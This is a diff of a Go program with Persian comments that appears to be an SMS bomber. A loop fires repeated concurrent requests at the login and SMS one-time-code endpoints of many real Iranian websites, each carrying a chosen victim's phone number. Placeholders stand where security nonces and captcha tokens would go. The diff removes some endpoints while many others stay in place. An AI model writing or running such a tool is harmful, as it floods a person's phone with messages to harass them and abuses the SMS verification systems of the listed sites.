@@ -326,28 +326,13 @@ func main() {
 
 	// --- حلقه اصلی برای اضافه کردن وظایف ---
 	for i := 0; i < repeatCount; i++ {
-           
-// https://www.irantic.com/api/login/authenticate (JSON)
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
-				"mobile": phone, // نیاز به 0 اول دارد
-			}, &wg, ch)
-		}
+        
 
 		// https://admin.zoodex.ir/api/v2/login/check?need_sms=1 (JSON)
 		wg.Add(1)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://admin.zoodex.ir/api/v2/login/check?need_sms=1", map[string]interface{}{
 				"mobile": phone, // نیاز به 0 اول دارد
-			}, &wg, ch)
-		}
-
-		// https://poltalk.me/api/v1/auth/phone (JSON)
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://poltalk.me/api/v1/auth/phone", map[string]interface{}{
-				"phone": phone, // نیاز به 0 اول دارد
 			}, &wg, ch)
 		}
 
@@ -375,15 +360,6 @@ func main() {
 					"ApplicationVersion": "1.0.0",
 				},
 			}, &wg, ch)
-		}
-
-
-		// https://gharar.ir/users/phone_number/ (Form Data)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("phone", phone) // نیاز به 0 اول دارد
-			sendFormRequest(ctx, "https://gharar.ir/users/phone_number/", formData, &wg, ch)
 		}
 
 		// https://farsgraphic.com/wp-admin/admin-ajax.php (Form Data - Part 1) - پیچیده، پارامترهای ثابت زیاد
@@ -504,18 +480,6 @@ func main() {
 		}
 
 
-		// https://refahtea.ir/wp-admin/admin-ajax.php (Form Data)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("action", "refah_send_code") // مقادیر ثابت
-			formData.Set("mobile", phone) // نیاز به 0 اول دارد
-			formData.Set("security", "placeholder") // ممکن است نیاز به دینامیک باشد
-
-			sendFormRequest(ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
-		}
-
-
 		// https://api6.arshiyaniha.com/api/v2/client/otp/send (JSON) - فرمت عجیب شماره تلفن
 		wg.Add(1)
 		tasks <- func() {
@@ -551,14 +515,6 @@ func main() {
 			formData.Set("dig_nounce", "placeholder") // ممکن است نیاز به دینامیک باشد
 
 			sendFormRequest(ctx, "https://steelalborz.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-		}
-
-		// https://pirankalaco.ir/SendPhone.php (Form Data)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("phone", phone) // نیاز به 0 اول دارد
-			sendFormRequest(ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch)
 		}
 
 		// https://kafegheymat.com/shop/getLoginSms (JSON) - نیاز به کپچا
@@ -599,14 +555,6 @@ func main() {
 			formData.Set("sub_action", "sms_otp") // مقادیر ثابت
 
 			sendFormRequest(ctx, "https://hiword.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
-		}
-
-		// https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/09123456456/sms?cCode=%2B98 (GET)
-		wg.Add(1)
-		tasks <- func() {
-			// شماره تلفن مستقیم در URL قرار می‌گیرد
-			urlWithPhone := fmt.Sprintf("https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/%s/sms?cCode=+98", phone) // نیاز به 0 اول و کد کشور در Query
-			sendGETRequest(ctx, urlWithPhone, &wg, ch)
 		}
 
 		// https://tagmond.com/phone_number (Form Data) - نیاز به کپچا
@@ -687,14 +635,6 @@ func main() {
 			formData.Set("mobile_number", phone) // نیاز به 0 اول دارد
 
 			sendFormRequest(ctx, "https://www.didnegar.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-		}
-
-		// https://www.drsaina.com/api/v1/authentication/user-exist?PhoneNumber=09123456456 (GET)
-		wg.Add(1)
-		tasks <- func() {
-			// شماره تلفن در Query String قرار می‌گیرد
-			urlWithPhone := fmt.Sprintf("https://www.drsaina.com/api/v1/authentication/user-exist?PhoneNumber=%s", phone) // نیاز به 0 اول
-			sendGETRequest(ctx, urlWithPhone, &wg, ch)
 		}
 
 		// https://my.limoome.com/auth/check-mobile (JSON - Part 1)
